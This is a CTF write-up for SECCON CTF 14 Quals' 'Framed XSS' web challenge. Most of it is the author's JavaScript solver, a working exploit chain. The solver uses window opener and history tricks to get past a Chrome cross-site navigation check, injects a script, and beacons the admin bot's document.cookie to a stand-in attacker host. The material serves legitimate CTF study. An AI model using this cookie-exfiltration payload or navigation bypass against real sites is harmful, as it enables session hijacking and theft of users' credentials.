---
title: "Framed XSS - SECCON CTF 14 Quals 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "framed", "web", "seccon-ctf-14-quals"]
summary: "The sandbox makes everything secure."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/framed-xss"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Quals"
  year: 2025
  challenge: "Framed XSS"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/framed-xss>
- **CTF:** SECCON CTF 14 Quals 2025

---

# [web] framed-xss

## Description

The sandbox makes everything secure.

- Challenge: `http://framed-xss.seccon.games:3000`
- Admin bot: `http://framed-xss.seccon.games:1337`

## Attachments

- [framed-xss](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/framed-xss/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = `
<script>navigator.sendBeacon("${CONNECTBACK_URL}/flag", document.cookie)</script>
`.trim();

let first = true;
app.get("/", async (req, reply) => {
  // Trick to bypass `is-cross-site-main-frame-navigation`
  // ref. https://chromestatus.com/feature/5190577638080512
  if (first) {
    first = false;
    reply
      .type("text/html; charset=utf-8")
      .header("Cache-Control", "no-store")
      .send(`<script>open("/child?html=${encodeURIComponent(html)}")</script>`);
  } else {
    reply.redirect(`http://web:3000/view?html=${encodeURIComponent(html)}`);
  }
});

app.get("/child", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(
    `
      <script type="module">
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
        const html = new URLSearchParams(location.search).get("html");

        await sleep(700);
        opener.location = "http://web:3000/?html=" + encodeURIComponent(html);
        await sleep(700);
        opener.location = "about:blank";
        await sleep(700);
        opener.history.go(-2);
      </script>
    `.trim()
  );
});

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
```
